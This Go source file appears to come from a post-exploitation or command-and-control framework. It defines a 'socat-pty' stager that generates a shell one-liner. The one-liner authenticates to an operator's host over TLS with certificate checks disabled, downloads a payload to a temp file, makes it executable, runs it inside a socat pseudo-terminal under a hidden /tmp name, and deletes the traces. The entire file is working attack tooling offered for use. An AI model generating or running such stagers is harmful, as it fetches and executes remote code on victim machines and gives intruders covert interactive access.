package loader

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

type socatPTY struct{}

func init() { Register(&socatPTY{}) }

func (s *socatPTY) Name() string        { return "socat-pty" }
func (s *socatPTY) Description() string { return "socat PTY allocation for interactive bootstrap" }
func (s *socatPTY) RequiresTool() string { return "socat" }

func (s *socatPTY) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (s *socatPTY) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("generate random name: %w", err)
	}
	name := hex.EncodeToString(b)
	return fmt.Sprintf(
		`f=$(mktemp);(printf '%%s\n' '%s';sleep 1)|socat - OPENSSL:%s:%s,verify=0 >$f;chmod +x $f;socat PTY,link=/tmp/.%s,raw,echo=0 EXEC:$f;rm -f $f /tmp/.%s`,
		opts.Token, opts.Host, opts.Port, name, name,
	), nil
}
